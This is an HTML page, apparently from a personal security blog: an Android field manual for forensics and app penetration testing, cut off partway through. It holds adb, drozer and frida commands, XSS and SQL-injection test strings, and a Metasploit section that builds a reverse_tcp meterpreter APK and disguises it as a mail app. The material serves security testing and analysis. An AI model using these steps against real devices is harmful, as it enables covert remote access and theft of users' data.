@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>BTFM and RTFM Android - Analyst</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="icon" href="https://bakerst221b.com/favicon.png">
+  <link href="/css/style-classic.css"></link>
+  
+  
+  <link rel="stylesheet" href="/css/style.min.32b06cb74069d8b26d087fbfd2852fc54428a31ff14ddead5c220eddcb248b07.css">
+  
+
+  
+
+</head>
+
+<body class='page page-default-single'>
+  <div id="main-menu-mobile" class="main-menu-mobile">
+  <ul>
+    
+    
+    <li class="menu-item-home">
+      <a href="/">
+        <span>Home</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-articles">
+      <a href="/docs/articles">
+        <span>Articles</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-blog">
+      <a href="/docs/blog">
+        <span>Blog</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-toolkit">
+      <a href="/docs/toolkit">
+        <span>Toolkit</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-about me">
+      <a href="/docs/about">
+        <span>About me</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-achievements">
+      <a href="/docs/achievements">
+        <span>Achievements</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-contacts">
+      <a href="/docs/contact">
+        <span>Contacts</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-notes">
+      <a href="/docs/notes">
+        <span>Notes</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+  <div class="wrapper">
+    <div class='header'>
+  <div class="container">
+    <div class="logo">
+      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.svg" /></a>
+    </div>
+    <div class="logo-mobile">
+      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
+    </div>
+    <div id="main-menu" class="main-menu">
+  <ul>
+    
+    
+    <li class="menu-item-home">
+      <a href="/">
+        <span>Home</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-articles">
+      <a href="/docs/articles">
+        <span>Articles</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-blog">
+      <a href="/docs/blog">
+        <span>Blog</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-toolkit">
+      <a href="/docs/toolkit">
+        <span>Toolkit</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-about me">
+      <a href="/docs/about">
+        <span>About me</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-achievements">
+      <a href="/docs/achievements">
+        <span>Achievements</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-contacts">
+      <a href="/docs/contact">
+        <span>Contacts</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-notes">
+      <a href="/docs/notes">
+        <span>Notes</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
+  <span class="hamburger-box">
+    <span class="hamburger-inner"></span>
+  </span>
+</button>
+  </div>
+</div>
+
+
+    
+    
+    
+    
+    
+    
+
+    
+    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
+      <div class="row">
+        <div class="col-12 col-md-3 mb-3">
+          <div class="sidebar">
+            
+<div class="docs-menu">
+  <p>
+   <a href="/docs/toolkit/manuals/"> Back to Manuals Section </a>
+  </p>
+  <aside>
+   <nav id="TableOfContents">
+  <ul>
+    <li><a href="#cheatsheet">Cheatsheet</a>
+      <ul>
+        <li><a href="#get-package-name">Get package name</a></li>
+        <li><a href="#get-path-to-apk">Get path to apk</a></li>
+        <li><a href="#get-application-local-files">Get Application Local Files</a></li>
+        <li><a href="#common-artifacts">Common Artifacts</a></li>
+        <li><a href="#application-vulnerability-assessment">Application Vulnerability Assessment</a></li>
+      </ul>
+    </li>
+    <li><a href="#get-device-info">Get Device Info</a></li>
+    <li><a href="#connecting">Connecting</a></li>
+    <li><a href="#install-apk">Install apk</a></li>
+    <li><a href="#local-storage">Local Storage</a></li>
+    <li><a href="#backup">Backup</a></li>
+    <li><a href="#debugging">Debugging</a>
+      <ul>
+        <li><a href="#jdb">JDB</a></li>
+      </ul>
+    </li>
+    <li><a href="#runtime-attacks">Runtime Attacks</a>
+      <ul>
+        <li><a href="#frida">Frida</a></li>
+        <li><a href="#trace">Trace</a></li>
+        <li><a href="#objection">Objection</a></li>
+      </ul>
+    </li>
+    <li><a href="#dump-apps-ram">Dump App&rsquo;s RAM</a>
+      <ul>
+        <li><a href="#fridump">Fridump</a></li>
+        <li><a href="#objection-1">Objection</a></li>
+      </ul>
+    </li>
+    <li><a href="#logs">Logs</a></li>
+    <li><a href="#get-app-list">Get App List</a>
+      <ul>
+        <li><a href="#drozer">Drozer</a></li>
+      </ul>
+    </li>
+    <li><a href="#get-app-info">Get App Info</a>
+      <ul>
+        <li><a href="#drozer-1">Drozer</a></li>
+      </ul>
+    </li>
+    <li><a href="#app-attacks">App Attacks</a>
+      <ul>
+        <li><a href="#attacks-on-activities">Attacks on activities:</a></li>
+        <li><a href="#attacks-on-broadcast-receivers">Attacks on broadcast receivers:</a></li>
+        <li><a href="#attacks-on-custom-url-schemes">Attacks on Custom URL Schemes:</a></li>
+        <li><a href="#attacks-on-content-providers">Attacks on content providers:</a></li>
+        <li><a href="#permissions-check">Permissions check</a></li>
+        <li><a href="#webviews">WebViews</a></li>
+        <li><a href="#injection">Injection</a></li>
+        <li><a href="#signatures">Signatures</a></li>
+      </ul>
+    </li>
+    <li><a href="#network">Network</a>
+      <ul>
+        <li><a href="#burp-certificate">Burp Certificate</a></li>
+      </ul>
+    </li>
+    <li><a href="#useful-greps">Useful greps</a></li>
+    <li><a href="#expoits">Expoits</a>
+      <ul>
+        <li><a href="#fragment-injection">Fragment injection</a></li>
+        <li><a href="#exploiter">Exploiter</a></li>
+        <li><a href="#metasploit">Metasploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#introspy">Introspy</a></li>
+    <li><a href="#bypasses">Bypasses</a>
+      <ul>
+        <li><a href="#root-detect">Root-detect</a></li>
+        <li><a href="#ssl-pinning">SSL pinning</a></li>
+        <li><a href="#patch">Patch</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+ </aside>
+ </div>
+
+
+
+          </div>
+        </div>
+        <div class="col-12 col-md-9">
+          
+<h1 class="title">BTFM and RTFM Android</h1>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    <div class="meta">
+      
+      <div class="article-category">domain: 
+          
+              
+                <i class="fas fa-search"></i>
+              
+          <a class="category-link" href="/domain/forensics">forensics</a>
+          
+              
+                <i class="fas fa-hammer"></i>
+              
+          <a class="category-link" href="/domain/appsec">appsec</a>
+          
+      </div> <br />
+      
+      <div class="article-category">doctype:
+          
+            
+              
+                <i class="fas fa-book"></i>
+              
+          <a class="platform-link" href="/doctype/field-manual">field manual</a>
+          
+      </div> <br /><br/>
+      
+      
+      
+      
+      <div class="article-category">
+          
+            
+            
+            
+            
+              <i class="fas fa-mobile"></i>
+            
+            
+          <a class="platform-link" href="/platforms/android">android</a>
+          
+      </div> <br />
+      
+
+      
+      
+
+      
+    </div>
+  </header>
+
+
+  <div class="content" itemprop="articleBody">
+    <p><em>This is a combination of BTFM and RTFM (Blue Team Field Manual and Red Team Field Manual) for Android devices and applications. I used to keep two separate field manuals at first, but since there are just too many intersections, I&rsquo;ve decided to combine them to make it easier to use. For iOS RTFM and BTFM see <a href="/docs/toolkit/manuals/ios-btfm-rtfm">here</a></em></p>
+<p>I use the below cheatsheet at the very beginning of forensic analysis or application testing.</p>
+<h2 id="cheatsheet">Cheatsheet</h2>
+<table>
+<thead>
+<tr>
+<th>INFO TO GET</th>
+<th>Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>package_name</td>
+<td></td>
+</tr>
+<tr>
+<td>path to apk</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="get-package-name">Get package name</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># option 1</span>
+frida-ps -U <span class="p">|</span> grep <span class="o">[</span>partial_name<span class="o">]</span>
+<span class="c1"># option 2</span>
+drozer console connect
+run app.package.list
+<span class="c1"># option 3</span>
+adb shell
+<span class="nb">cd</span> /data/data/
+ls <span class="p">|</span> grep <span class="o">[</span>partial_name<span class="o">]</span>
+</code></pre></div><h3 id="get-path-to-apk">Get path to apk</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># option 1</span>
+adb shell pm path <span class="o">[</span>package_name<span class="o">]</span>
+<span class="c1"># option 2</span>
+drozer console connect
+run app.package.info –a <span class="o">[</span>package_name<span class="o">]</span>
+</code></pre></div><h3 id="get-application-local-files">Get Application Local Files</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
+su
+<span class="nb">cd</span> /data/data <span class="o">&amp;&amp;</span> tar -czvf /sdcard/packagename.tar /packagename
+<span class="c1"># Ctrl+D</span>
+adb pull /sdcard/packagename.tar .
+</code></pre></div><h3 id="common-artifacts">Common Artifacts</h3>
+<h3 id="application-vulnerability-assessment">Application Vulnerability Assessment</h3>
+<p>In the process of preparing a script to automate this process (partly, wherever possible).</p>
+<table>
+<thead>
+<tr>
+<th>Test</th>
+<th>🍎 OR🍏</th>
+<th>comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GUI</strong></td>
+<td></td>
+<td>🔍</td>
+</tr>
+<tr>
+<td><strong>Logs</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Local Storage Info Leak</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Backup Info Leak</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Root-detect</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>SSL pinning</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>APK Info leak</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Local Authentication</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Traffic Info Leak</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Code Obfuscation</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Runtime Attacks</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Debug</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>RAM Leak</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Crypto</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Activities</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Broadcast Receivers</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Broadcast Senders</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Content Providers</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Custom URL Schemes</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Services</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>WebViews Check</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Injections</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Firebase configuration</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Signatures</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Third-party libraries</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Instant Applications</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Logical Bugs</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Error Handling</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="get-device-info">Get Device Info</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell getprop ro.build.version.release <span class="c1"># get Android version</span>
+adb shell getprop ro.build.version.sdk <span class="c1"># get API version</span>
+adb shell getprop <span class="c1"># all device info</span>
+adb shell cat /system/build.prop <span class="c1"># another way to get this info</span>
+</code></pre></div><h2 id="connecting">Connecting</h2>
+<p>Over USB:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
+</code></pre></div><p>Over WiFi:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell ifconfig <span class="c1"># get mobile device IP</span>
+adb tcpip <span class="m">5555</span> <span class="c1"># start adb in tcpip mode</span>
+adb connect <span class="o">[</span>mobile_IP<span class="o">]</span>:5555 <span class="c1"># disconnect USB before that</span>
+adb shell <span class="c1"># to check</span>
+adb usb <span class="c1"># disable tcpip mode</span>
+</code></pre></div><h2 id="install-apk">Install apk</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb install <span class="o">[</span>appname<span class="o">]</span>.apk
+</code></pre></div><h2 id="local-storage">Local Storage</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
+su
+<span class="nb">cd</span> /data/data <span class="o">&amp;&amp;</span> tar -czvf /sdcard/packagename.tar /packagename
+<span class="c1"># Ctrl+D</span>
+adb pull /sdcard/packagename.tar .
+</code></pre></div><h2 id="backup">Backup</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># create *.ab file with backup data</span>
+adb backup -f mybackup.ab <span class="c1"># for all</span>
+adb backup -f mybackup.ab -apk <span class="c1"># for one app</span>
+
+<span class="c1"># convert *.ab to *.tar and unpack</span>
+java -jar <span class="o">[</span>path_to_abe.jar<span class="o">]</span>/abe.jar mybackup.tar mybackup.ab <span class="o">[</span>password_optional<span class="o">]</span> <span class="c1"># win</span>
+
+dd <span class="k">if</span><span class="o">=</span>backup.ab <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">24</span> <span class="p">|</span> python -c <span class="s2">&#34;import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))&#34;</span> &gt; backup.tar <span class="c1"># linux option1</span>
+dd <span class="k">if</span><span class="o">=</span>mybackup.ab <span class="nv">bs</span><span class="o">=</span><span class="m">24</span> <span class="nv">skip</span><span class="o">=</span>1<span class="p">|</span>openssl zlib -d &gt; mybackup.tar <span class="c1"># linux option1 </span>
+</code></pre></div><p><a href="https://github.com/nelenkov/android-backup-extractor">abe.jar</a></p>
+<h2 id="debugging">Debugging</h2>
+<h3 id="jdb">JDB</h3>
+<p>Useful to <a href="https://www.youtube.com/watch?v=fVZXeZ07tS4">watch</a> regarding debugging in Android applications.</p>
+<p>Get PID list:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb jdwp, либо frida-ps -U <span class="p">|</span> Select-String <span class="s2">&#34;[partialname]&#34;</span> <span class="c1">#windows</span>
+frida-ps -U <span class="p">|</span> grep <span class="s2">&#34;[partialname]&#34;</span> <span class="c1">#linux</span>
+</code></pre></div><p>Forward in adb:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb forward tcp:12345 jdwp:<span class="o">[</span>PID_of_app<span class="o">]</span>
+</code></pre></div><p>Connect to process:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">jdb -connect com.sun.jdi.SocketAttach:port<span class="o">=</span><span class="m">12345</span> <span class="c1">#windows</span>
+jdb -attach localhost:12345 //не проверялось <span class="c1">#linux</span>
+</code></pre></div><p>Check what apps are debuggable:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">drozer console connect
+&gt; run app.package.debuggable
+</code></pre></div><h2 id="runtime-attacks">Runtime Attacks</h2>
+<h3 id="frida">Frida</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
+su
+<span class="nb">cd</span> /sbin
+<span class="c1"># to use frida over USB </span>
+./frida
+<span class="c1"># to use frida over WiFi</span>
+./frida -l <span class="o">[</span>device_ip<span class="o">]</span>
+</code></pre></div><h3 id="trace">Trace</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">frida-trace -U -i “*<span class="o">[</span>function_name_full_or_partial<span class="o">]</span>*” “<span class="o">[</span>package_name or PID<span class="o">]</span>” <span class="c1"># over USB </span>
+
+frida-trace -H <span class="o">[</span>mobile phone IP<span class="o">]</span> -i “*<span class="o">[</span>function_name_full_or_partial<span class="o">]</span>*” “<span class="o">[</span>package_name or PID<span class="o">]</span>” <span class="c1"># over WiFi</span>
+
+frida-trace –U “<span class="o">[</span>package_name or PID<span class="o">]</span>” -m <span class="s2">&#34;-[NSURL* *HTTP*]&#34;</span> <span class="c1"># for functions workimg with HTTP</span>
+</code></pre></div><h3 id="objection">Objection</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">objection -g <span class="o">[</span>package_name<span class="o">]</span> explore <span class="c1"># launch</span>
+</code></pre></div><h2 id="dump-apps-ram">Dump App&rsquo;s RAM</h2>
+<h3 id="fridump">Fridump</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
+su /sbin
+./frida-server
+
+python fridump.py --usb -r -s --max-size <span class="m">1000000000</span> -o . <span class="o">[</span>package_name<span class="o">]</span>
+</code></pre></div><p>Result in <code>string.txt</code></p>
+<h3 id="objection-1">Objection</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
+su /sbin
+./frida-server
+
+objection -g <span class="o">[</span>package_name<span class="o">]</span> explore 
+memory dumpall <span class="o">[</span>dump_name<span class="o">]</span>
+strings.exe <span class="o">[</span>dump_name<span class="o">]</span> &gt; strings.txt
+</code></pre></div><p>Result in <code>string.txt</code></p>
+<h2 id="logs">Logs</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb logcat <span class="p">|</span> grep <span class="s2">&#34;keyword&#34;</span> &gt; logs.txt
+adb logcat --pid<span class="o">=</span><span class="m">8423</span> &gt; logs.txt <span class="c1"># log specific process by PID</span>
+</code></pre></div><h2 id="get-app-list">Get App List</h2>
+<h3 id="drozer">Drozer</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb forward tcp:31415 tcp:31415
+drozer console connect
+run app.package.list
+</code></pre></div><h2 id="get-app-info">Get App Info</h2>
+<h3 id="drozer-1">Drozer</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb forward tcp:31415 tcp:31415
+drozer console connect
+
+run app.package.info -a <span class="o">[</span>package_name<span class="o">]</span>
+run app.package.manifest <span class="o">[</span>package_name<span class="o">]</span>
+run app.package.attacksurface<span class="o">[</span>package_name<span class="o">]</span>
+</code></pre></div><h2 id="app-attacks">App Attacks</h2>
+<p>Launch drozer agent on mobile device then run in terminal:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb forward tcp:31415 tcp:31415
+drozer console connect
+</code></pre></div><h3 id="attacks-on-activities">Attacks on activities:</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.activity.info -a <span class="o">[</span>package_name<span class="o">]</span>
+run app.activity.start --component <span class="o">[</span>package_name<span class="o">]</span> <span class="o">[</span>activity_full_name<span class="o">]</span>
+</code></pre></div><h3 id="attacks-on-broadcast-receivers">Attacks on broadcast receivers:</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.broadcast.info -a <span class="o">[</span>package_name<span class="o">]</span>
+
+run app.broadcast.send --action &lt;action from Manifest&gt; --component &lt;fullclassname&gt; &lt;classname&gt; --extra string &lt;varname&gt; &lt;value&gt;
+
+run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber <span class="m">123456789</span> --extra string message <span class="s2">&#34;Hello mate!&#34;</span>
+</code></pre></div><h3 id="attacks-on-custom-url-schemes">Attacks on Custom URL Schemes:</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.activity.browsable -a <span class="o">[</span>package_name<span class="o">]</span> <span class="c1"># to find browsable activities</span>
+dz&gt; run app.activity.start  --action android.intent.action.VIEW --data-uri <span class="s2">&#34;sms://0123456789&#34;</span> <span class="c1"># to launch such activity with parameters passed</span>
+</code></pre></div><h3 id="attacks-on-content-providers">Attacks on content providers:</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.provider.finduris -a <span class="o">[</span>package_name<span class="o">]</span>
+run app.provider.query content://<span class="o">[</span>URI_to_the_content<span class="o">]</span>
+run app.provider.query content:// <span class="o">[</span>package_name<span class="o">]</span>.<span class="o">[</span>provider_name<span class="o">]</span> --vertical
+run scanner.provider.injection -a <span class="o">[</span>package_name<span class="o">]</span>
+</code></pre></div><p>Examples of insert:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.provider.insert content://com.vulnerable.im/messages
+--string date <span class="m">1331763850325</span>
+--string <span class="nb">type</span> <span class="m">0</span>
+--integer _id <span class="m">7</span>
+run app.provider.update content://settings/secure
+--selection <span class="s2">&#34;name=?&#34;</span>
+--selection-args assisted_gps_enabled
+--integer value <span class="m">0</span>
+run app.provider.delete content://settings/secure
+--selection <span class="s2">&#34;name=?&#34;</span>
+--selection-args my_setting
+</code></pre></div><h3 id="permissions-check">Permissions check</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell dumpsys package <span class="o">[</span>package_name<span class="o">]</span> <span class="p">|</span> grep permission
+drozer agent build  --permission android.permission.REQUIRED_PERMISSION
+run app.package.attacksurface com.android.insecurebankv2
+run app.activity.info -a <span class="o">[</span>package_name<span class="o">]</span>
+run app.broadcast.info -a <span class="o">[</span>package_name<span class="o">]</span>
+run scanner.provider.finduris -a <span class="o">[</span>package_name<span class="o">]</span>
+run app.service.info -a <span class="o">[</span>package_name<span class="o">]</span>
+</code></pre></div><h3 id="webviews">WebViews</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">setJavaScriptEnabled<span class="o">(</span><span class="nb">true</span><span class="o">)</span>, android.permission.READ_EXTERNAL_STORAGE <span class="nv">UniversalAccessFromFileURLs</span> <span class="o">=</span> <span class="nb">true</span>
+</code></pre></div><h3 id="injection">Injection</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">фрагменты - android:targetSdkVersion &lt; 19, extends PreferenceActivity, isValidFragment. 
+&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt; 
+‘ or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> --
+</code></pre></div><h3 id="signatures">Signatures</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">apksigner verify --verbose Desktop/example.apk
+jarsigner -verify -verbose -certs example.apk
+</code></pre></div><h2 id="network">Network</h2>
+<h3 id="burp-certificate">Burp Certificate</h3>
+<p>Proxy → Options → Proxy Listeners → Import/Export CA Certificate → Export → Certificate key in Der format (1st option). Choose path and name for the certificate.</p>
+<blockquote>
+<p>🚫 Error: Openssl not installed</p>
+<p>✅ Fix: on Windows download from <a href="https://slproweb.com/products/Win32OpenSSL.html">here</a>. Add <code>C:\OpenSSL-Win64\bin</code> to PATH environment variable. On Mac: <code>brew install openssl</code>.</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">openssl x509 -inform DER -in cacert.der -out cacert.pem <span class="c1"># convert from from der to pem</span>
+openssl x509 -inform PEM -subject_hash_old -in cacert.pem <span class="c1"># get the certificate’s hash</span>
+mv cacert.pem <span class="o">[</span>hash<span class="o">]</span>.pem <span class="c1"># Rename cacert.pem into [hash].pem</span>
+adb push <span class="o">[</span>hash<span class="o">]</span>.pem /sdcard <span class="c1"># upload on Android</span>
+</code></pre></div><p><strong>On Android</strong> Certificates or CA - find in settings. <code>Install Certificates</code> → choose sdcard location and install it.</p>
+<p><strong>NB</strong>❗ Lock screen should be enabled in this case.</p>
+<p>To add the cert as a root certificates (not usually neccessary):</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb root
+adb push 9a5ba575.0 /sdcard/
+adb shell
+su
+mount -o remount,rw /system
+mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/
+chmod <span class="m">644</span> /system/etc/security/cacerts/9a5ba575.0 
+reboot
+</code></pre></div><h2 id="useful-greps">Useful greps</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">grep -rP  <span class="s1">&#39;(https?):\/\/(www\.)?[a-z0-9.:].*?(?=\s)&#39;</span> .&gt; ../links.txt <span class="c1"># links</span>
+grep -r -E -o <span class="s2">&#34;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b&#34;</span> . <span class="c1"># email</span>
+grep -r -E -o <span class="s2">&#34;4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&#34;</span> .  <span class="c1"># visa cards numbers</span>
+mstercard grep -r -E -o <span class="s2">&#34;5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&#34;</span> . <span class="c1"># mastercard</span>
+</code></pre></div><h2 id="expoits">Expoits</h2>
+<h3 id="fragment-injection">Fragment injection</h3>
+<p>sdk &lt; 19 &amp;&amp; device &lt; 4.4. The code below is from <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/">Mobile Security Guide</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+<span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TASK</span><span class="o">);</span>
+<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;pt.claudio.insecurefragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MainActivity&#34;</span><span class="o">);</span>
+<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;:android:show_fragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MyFragment&#34;</span><span class="o">);</span>
+<span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;https://security.claudio.pt&#34;</span><span class="o">));</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span> <span class="err">#</span> <span class="n">here</span> <span class="n">is</span> <span class="n">supposed</span> <span class="n">to</span> <span class="n">be</span> <span class="n">the</span> <span class="n">malicious</span> <span class="n">data</span> <span class="n">passed</span>
+</code></pre></div><h3 id="exploiter">Exploiter</h3>
+<p><a href="">Here</a> is the link to my Android application, which implements all common attacks as a &ldquo;malicous&rdquo; application as is described in <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/">Mobile Security Testing Guide</a>. For example, it contains exploit for <a href="/docs/articles/mobile/android/complex-attacks/">this</a> vulnerability.</p>
+<h3 id="metasploit">Metasploit</h3>
+<p>Create a stager and output into mail.apk</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom --platform android --arch dalvik -p android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.72.208 <span class="nv">LPORT</span><span class="o">=</span><span class="m">8888</span> -f raw -o mail.apk
+</code></pre></div><p>Checked on Samsung DUOS</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom --platform android --arch dalvik -p android/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.72.208 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f raw -o mail.apk
+</code></pre></div><p>Change the name for the app as it is seen on the phone:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">apktool d mail.apk
+<span class="nb">cd</span> mail/res/values
+nano strings.xml
+</code></pre></div><p>Change <code>MainActivity</code> to <code>Mail</code> and save.  Download some icon for the application, and copy it into <code>/mipmap/res/mipmap/</code> folder.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> ..
+mkdir mipmap
+copy icon to /res/mipmap/
+AndroidManifest.xml
+</code></pre></div><p>Open AndroidManifest.xml and add a link to that icon:</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;application</span> <span class="na">android:label=</span><span class="s">&#34;@string/app_name&#34;</span> <span class="na">android:icon=</span><span class="s">&#34;@mipmap/mail&#34;</span><span class="nt">&gt;</span>
+</code></pre></div><p>Build, create a key and sign the application with that key:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">apktool b mail -o mail_temp.apk
+
+keytool -genkey  -v -keystore eccouncil.Keystore -alias pentestandroid -keyalg RSA -keysize  <span class="m">2048</span> -validity <span class="m">10000</span>
+
